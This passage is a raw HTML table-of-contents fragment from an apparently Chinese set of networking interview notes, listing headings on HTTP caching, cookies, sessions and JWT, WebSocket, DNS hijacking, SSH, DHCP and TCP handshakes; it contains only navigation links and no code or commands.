href="#%F0%9F%94%81-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%B7%E6%B1%82%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E5%8F%91%E8%B5%B7%EF%BC%89"><span class="toc-text">🔁 第二次请求（5分钟后发起）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%B8%80%EF%BC%9A%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4-Expires"><span class="toc-text">情况一：当前时间 &lt; Expires</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%83%85%E5%86%B5%E4%BA%8C%EF%BC%9A%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4-Expires"><span class="toc-text">情况二：当前时间 &gt; Expires</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%F0%9F%A7%A0-%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%88%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AE%E8%AE%A4%E8%B5%84%E6%BA%90%E6%98%AF%E5%90%A6%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="toc-text">二、🧠 协商缓存机制（向服务器确认资源是否更新）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%A0%B8%E5%BF%83%E5%AD%97%E6%AE%B5%EF%BC%9A"><span class="toc-text">🎯 核心字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-ETag%EF%BC%88%E5%AE%9E%E4%BD%93%E6%A0%87%E7%AD%BE%EF%BC%89%E6%98%AF%E8%B5%84%E6%BA%90%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%E7%AC%A6%EF%BC%88%E6%AF%94%E5%A6%82%E6%96%87%E4%BB%B6%E7%9A%84%E5%93%88%E5%B8%8C%E5%80%BC%EF%BC%89"><span class="toc-text">✅ ETag（实体标签）是资源的唯一标识符（比如文件的哈希值）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-text">例子：第一次请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-text">例子：第二次请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E3%80%81session%E3%80%81jwt%E3%80%81token"><span class="toc-text">cookie、session、jwt、token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A6-%E4%B8%80%E3%80%81Cookie-%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="toc-text">📦 一、Cookie 示例与流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AD-%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">🧭 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">✅ 流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%96%EF%B8%8F-%E4%BC%98%E7%BC%BA%E7%82%B9%EF%BC%9A"><span class="toc-text">⚖️ 优缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E4%BA%8C%E3%80%81Session-%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="toc-text">🎯 二、Session 示例与流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AD-%E5%9C%BA%E6%99%AF%EF%BC%9A-2"><span class="toc-text">🧭 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B5%81%E7%A8%8B%EF%BC%9A-2"><span class="toc-text">✅ 流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%96%EF%B8%8F-%E4%BC%98%E7%BC%BA%E7%82%B9%EF%BC%9A-2"><span class="toc-text">⚖️ 优缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%BE-%E4%B8%89%E3%80%81Token-%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%B5%81%E7%A8%8B%EF%BC%88%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%EF%BC%89"><span class="toc-text">🧾 三、Token 示例与流程（自定义的）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AD-%E5%9C%BA%E6%99%AF%EF%BC%9A-3"><span class="toc-text">🧭 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B5%81%E7%A8%8B%EF%BC%9A-3"><span class="toc-text">✅ 流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%96%EF%B8%8F-%E4%BC%98%E7%BC%BA%E7%82%B9%EF%BC%9A-3"><span class="toc-text">⚖️ 优缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%90-%E5%9B%9B%E3%80%81JWT%EF%BC%88JSON-Web-Token%EF%BC%89"><span class="toc-text">🔐 四、JWT（JSON Web Token）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AD-%E5%9C%BA%E6%99%AF%EF%BC%9A-4"><span class="toc-text">🧭 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-JWT-%E5%86%85%E5%AE%B9%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">✅ JWT 内容结构：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%B5%81%E7%A8%8B%EF%BC%9A-4"><span class="toc-text">✅ 流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%96%EF%B8%8F-%E4%BC%98%E7%BC%BA%E7%82%B9%EF%BC%9A-4"><span class="toc-text">⚖️ 优缺点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%85%88%E6%98%8E%E7%A1%AE%EF%BC%9AJWT-Token-%E6%9C%AC%E8%BA%AB%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E2%80%9C%E6%97%A0%E7%8A%B6%E6%80%81%E8%AE%A4%E8%AF%81%E2%80%9D"><span class="toc-text">✅ 先明确：JWT Token 本身可以做到“无状态认证”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97%E9%82%A3%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BE%88%E5%A4%9A%E7%B3%BB%E7%BB%9F%E4%BB%8D%E7%84%B6%E6%8A%8A-token-%E5%AD%98-Redis%EF%BC%9F"><span class="toc-text">❗那为什么很多系统仍然把 token 存 Redis？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%92-1-%E6%94%AF%E6%8C%81-token-%E4%B8%BB%E5%8A%A8%E5%A4%B1%E6%95%88%EF%BC%88%E5%A6%82%E7%94%A8%E6%88%B7%E6%B3%A8%E9%94%80%EF%BC%89"><span class="toc-text">🔒 1. 支持 token 主动失效（如用户注销）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%8F%B3-2-%E6%94%AF%E6%8C%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%9F%E4%B8%80%E5%88%B7%E6%96%B0-%E5%BB%B6%E9%95%BF-token-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">⏳ 2. 支持服务端统一刷新 &#x2F; 延长 token 生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%B1-3-%E5%A4%9A%E8%AE%BE%E5%A4%87%E7%99%BB%E5%BD%95%E6%8E%A7%E5%88%B6%E3%80%81%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%EF%BC%88SSO%EF%BC%89"><span class="toc-text">🧱 3. 多设备登录控制、单点登录（SSO）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-4-%E9%85%8D%E5%90%88%E5%88%B7%E6%96%B0-token-%E6%9C%BA%E5%88%B6%EF%BC%88RefreshToken%EF%BC%89"><span class="toc-text">🔁 4. 配合刷新 token 机制（RefreshToken）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A-2"><span class="toc-text">✅ 总结一句话：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get%E5%92%8Cpost%E5%8C%BA%E5%88%AB"><span class="toc-text">get和post区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%90-%E5%AE%89%E5%85%A8%E6%80%A7%E8%AF%B4%E6%98%8E%EF%BC%88%E4%BB%A5-GET-%E6%B3%84%E5%AF%86%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-text">🔐 安全性说明（以 GET 泄密为例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E4%B8%8EWebSocket"><span class="toc-text">http与WebSocket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81HTTP-%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%B8%8D%E8%B6%B3%EF%BC%9A%E5%AE%83%E6%98%AF%E2%80%9C%E7%9F%AD%E8%BF%9E%E6%8E%A5-%E8%AF%B7%E6%B1%82%E5%93%8D%E5%BA%94%E2%80%9D%E6%A8%A1%E5%9E%8B"><span class="toc-text">✅ 一、HTTP 协议的不足：它是“短连接 + 请求响应”模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81WebSocket-%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9A%E5%BB%BA%E7%AB%8B%E4%B8%80%E6%AC%A1%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%B0%B1%E8%83%BD%E5%8F%8C%E5%90%91%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1"><span class="toc-text">✅ 二、WebSocket 的优势：建立一次连接，就能双向实时通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E6%89%80%E4%BB%A5%E8%AF%B4%E8%BF%99%E5%8F%A5%E8%AF%9D%E7%9A%84%E5%90%AB%E4%B9%89%E6%98%AF%EF%BC%9A"><span class="toc-text">✅ 三、所以说这句话的含义是：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A"><span class="toc-text">🎯 场景设定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BD%BF%E7%94%A8-HTTP-%E5%AE%9E%E7%8E%B0%EF%BC%88%E8%BD%AE%E8%AF%A2%EF%BC%89"><span class="toc-text">一、使用 HTTP 实现（轮询）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%87-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">👇 客户端流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E7%BC%BA%E7%82%B9%EF%BC%9A-4"><span class="toc-text">❌ 缺点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8-WebSocket-%E5%AE%9E%E7%8E%B0%EF%BC%88%E6%8E%A8%E9%80%81%EF%BC%89"><span class="toc-text">二、使用 WebSocket 实现（推送）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%87-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E7%A8%8B%EF%BC%9A-2"><span class="toc-text">👇 客户端流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BC%98%E7%82%B9%EF%BC%9A-2"><span class="toc-text">✅ 优点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E6%96%AD%E7%BA%BF%E9%87%8D%E8%BF%9E"><span class="toc-text">✅ 一、断线重连</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AF%B4%E6%98%8E"><span class="toc-text">🎯 场景说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88"><span class="toc-text">💡 实现方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-text">📌 注意：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%A4%BA%E4%BE%8B"><span class="toc-text">📌 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%A4-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF"><span class="toc-text">🎤 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%BF%83%E8%B7%B3%E4%BF%9D%E6%B4%BB%EF%BC%88ping-pong%EF%BC%89"><span class="toc-text">✅ 二、心跳保活（ping&#x2F;pong）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AF%B4%E6%98%8E-2"><span class="toc-text">🎯 场景说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88-2"><span class="toc-text">💡 实现方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%A4%BA%E4%BE%8B-2"><span class="toc-text">📌 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%A4-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF-2"><span class="toc-text">🎤 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%EF%BC%88JWT%EF%BC%89"><span class="toc-text">✅ 三、安全认证（JWT）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AF%B4%E6%98%8E-3"><span class="toc-text">🎯 场景说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88-3"><span class="toc-text">💡 实现方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%A4%BA%E4%BE%8B-3"><span class="toc-text">📌 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%A4-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF-3"><span class="toc-text">🎤 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E7%8A%B6%E6%80%81%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%88%E6%B6%88%E6%81%AF%E4%B9%B1%E5%BA%8F%E3%80%81%E4%B8%A2%E5%A4%B1%EF%BC%89"><span class="toc-text">✅ 四、状态一致性（消息乱序、丢失）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AF%B4%E6%98%8E-4"><span class="toc-text">🎯 场景说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88-4"><span class="toc-text">💡 实现方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E7%A4%BA%E4%BE%8B-4"><span class="toc-text">📌 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%A4-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF-4"><span class="toc-text">🎤 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%AC-%E6%80%BB%E7%BB%93%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E5%BB%BA%E8%AE%AE"><span class="toc-text">💬 总结面试答题建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%A4-%E9%9D%A2%E8%AF%95%E5%AE%98%E6%8F%90%E9%97%AE%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF%EF%BC%9A"><span class="toc-text">🎤 面试官提问答题模板：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%AE%9E%E6%97%B6%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81%EF%BC%88%E7%9F%AD%E8%BD%AE%E8%AF%A2%E3%80%81%E9%95%BF%E8%BD%AE%E8%AF%A2%E3%80%81iframe%E6%B5%81%E3%80%81SSE%E3%80%81WebSocket%E3%80%81MQTT%EF%BC%89"><span class="toc-text">Web实时消息推送（短轮询、长轮询、iframe流、SSE、WebSocket、MQTT）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A6-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-text">📦 举个例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-MQTT-%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-text">用 MQTT 实现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-HTTP-%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-text">用 HTTP 实现：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%AC-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF"><span class="toc-text">💬 面试回答模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8A%AB%E6%8C%81"><span class="toc-text">DNS劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%A5-%E4%B8%BE%E4%B8%AA%E7%9C%9F%E5%AE%9E%E4%BE%8B%E5%AD%90"><span class="toc-text">🔥 举个真实例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-DNS-%E5%8A%AB%E6%8C%81%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%9A"><span class="toc-text">⚠️ DNS 劫持的后果：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">SSH协议的工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A"><span class="toc-text">✅ 场景设定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%95%B4%E4%B8%AA%E8%BF%9E%E6%8E%A5%E6%B5%81%E7%A8%8B%EF%BC%9A%E8%AF%A6%E7%BB%86%E5%88%86-7-%E6%AD%A5%E8%AF%B4%E6%98%8E-%E4%B8%BE%E4%BE%8B"><span class="toc-text">✅ 整个连接流程：详细分 7 步说明 + 举例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-1-%E6%AD%A5%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E8%B5%B7-TCP-%E8%BF%9E%E6%8E%A5"><span class="toc-text">第 1 步：客户端发起 TCP 连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-2-%E6%AD%A5%EF%BC%9A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E9%80%81%E7%89%88%E6%9C%AC%E5%8F%B7-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%97%E8%A1%A8"><span class="toc-text">第 2 步：服务端发送版本号 + 加密算法列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-3-%E6%AD%A5%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%89%E6%8B%A9%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F-%E9%AA%8C%E8%AF%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BA%AB%E4%BB%BD"><span class="toc-text">第 3 步：客户端选择加密方式 + 验证服务器身份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-4-%E6%AD%A5%EF%BC%9A%E5%BB%BA%E7%AB%8B%E2%80%9C%E5%85%B1%E4%BA%AB%E5%AF%86%E9%92%A5%E2%80%9D%EF%BC%88%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%EF%BC%89"><span class="toc-text">第 4 步：建立“共享密钥”（密钥交换）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-5-%E6%AD%A5%EF%BC%9A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%88%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-text">第 5 步：客户端进行身份验证（登录）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81"><span class="toc-text">✅ 登录方式一：输入密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%99%BB%E5%BD%95%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8%E7%A7%81%E9%92%A5%E8%AE%A4%E8%AF%81"><span class="toc-text">✅ 登录方式二：使用私钥认证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-6-%E6%AD%A5%EF%BC%9A%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2"><span class="toc-text">第 6 步：登录成功，进入命令行界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC-7-%E6%AD%A5%EF%BC%9A%E5%BC%80%E5%A7%8B%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1"><span class="toc-text">第 7 步：开始加密通信</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%EF%BC%88%E9%9D%A2%E8%AF%95%E6%97%B6%E6%80%8E%E4%B9%88%E8%AF%B4%EF%BC%9F%EF%BC%89"><span class="toc-text">✅ 总结（面试时怎么说？）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DHCP%E5%8D%8F%E8%AE%AE"><span class="toc-text">DHCP协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-DHCP-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">✅ 1. DHCP 是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2-%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%BE%8B%EF%BC%9A%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5-Wi-Fi-%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">✅ 2. 场景举例：手机连接 Wi-Fi 的全过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E5%81%87%E8%AE%BE%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">🔍 假设场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9ADiscover%EF%BC%88%E5%8F%91%E7%8E%B0%EF%BC%89"><span class="toc-text">✅ 第一步：Discover（发现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AOffer%EF%BC%88%E6%8F%90%E4%BE%9B%EF%BC%89"><span class="toc-text">✅ 第二步：Offer（提供）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9ARequest%EF%BC%88%E8%AF%B7%E6%B1%82%EF%BC%89"><span class="toc-text">✅ 第三步：Request（请求）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9AAcknowledge%EF%BC%88%E7%A1%AE%E8%AE%A4%EF%BC%89"><span class="toc-text">✅ 第四步：Acknowledge（确认）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-4-%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C"><span class="toc-text">✅ 4. 最终结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-5-%E9%9D%A2%E8%AF%95%E6%97%B6%E6%80%8E%E4%B9%88%E8%AF%B4%EF%BC%9F"><span class="toc-text">✅ 5. 面试时怎么说？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"><span class="toc-text">TCP三次握手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%93%E9%9D%A2%E8%AF%95%E5%AE%98%EF%BC%9ATCP-%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%AC%AC%E4%B8%89%E6%AC%A1-ACK-%E4%B8%A2%E5%A4%B1%E4%BC%9A%E6%80%8E%E6%A0%B7%EF%BC%9F"><span class="toc-text">❓面试官：TCP 三次握手过程中，如果第三次 ACK 丢失会怎样？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A4%94-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%8F%AF%E4%BB%A5%E6%90%BA%E5%B8%A6%E6%95%B0%E6%8D%AE%EF%BC%9F"><span class="toc-text">🤔 为什么第三次可以携带数据？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E8%BF%99%E6%A0%B7%E7%AD%94%EF%BC%88%E6%A8%A1%E6%9D%BF%EF%BC%89%EF%BC%9A"><span class="toc-text">🧠 面试这样答（模板）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B"><span class="toc-text">TCP四次挥手</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%AC%AC%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%9C%80%E8%A6%81%E7%AD%89%E5%BE%85-2-MSL%EF%BC%88%E6%8A%A5%E6%96%87%E6%AE%B5%E6%9C%80%E9%95%BF%E5%AF%BF%E5%91%BD%EF%BC%89%E6%97%B6%E9%97%B4%E5%90%8E%E6%89%8D%E8%BF%9B%E5%85%A5-CLOSED-%E7%8A%B6%E6%80%81%EF%BC%9F"><span class="toc-text">为什么第四次挥手客户端需要等待 2*MSL（报文段最长寿命）时间后才进入 CLOSED 状态？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 